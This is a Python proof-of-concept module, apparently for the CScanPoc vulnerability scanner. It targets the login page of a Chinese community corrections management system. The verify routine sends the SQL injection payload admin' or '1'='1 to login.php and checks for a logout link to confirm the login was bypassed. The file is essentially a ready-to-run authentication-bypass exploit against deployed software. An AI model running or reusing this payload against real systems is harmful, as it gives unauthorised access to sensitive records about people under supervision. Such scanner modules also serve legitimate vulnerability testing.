# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'SQJZ_0001'  # 平台漏洞编号，留空
    name = '社区矫正管理系统万能密码登录'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2016-01-22'  # 漏洞公布时间
    desc = '''
        社区矫正管理系统结合现在国内社区矫正工作的管理特点，实现矫正工作流程中矫正衔接、矫正执行、管理监督、矫正解除各个环节的管理。
        社区矫正管理系统万能密码登录。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0147553'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '社区矫正管理系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '66de0de2-18a2-44ff-bddb-32c8f333692f'
    author = '国光'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = 'username=admin%27+or+%271%27%3D%271&password=&verify='
            url = arg + '/login.php?action=login'
            url2 = arg + '/index.php'
            code, head, res, errcode, _ = hh.http(url, post=payload)
            if code == 302:
                code, head, res, errcode, _ = hh.http(url2)
                if code == 200 and 'login.php?action=logout' in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
